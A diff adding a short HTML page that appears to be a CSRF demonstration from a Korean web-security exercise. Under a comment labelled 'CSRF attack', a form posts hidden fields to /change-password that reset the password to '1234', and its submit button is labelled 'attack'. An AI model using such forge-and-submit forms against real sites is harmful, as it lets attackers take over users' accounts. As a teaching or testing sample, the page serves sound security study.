@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>home</title>
+</head>
+<body>
+<div class="home-container">
+    <h2>HOME</h2>
+    <h3>게시판</h3>
+
+    <!--    CSRF 공격-->
+    <form action="/change-password" method="post">
+        <input type="hidden" name="new_pw" value="1234">
+        <input type="hidden" name="confirm_pw" value="1234">
+        <input type="submit" value="공격">
+    </form>
+
+</div>
+</body>
+</html>
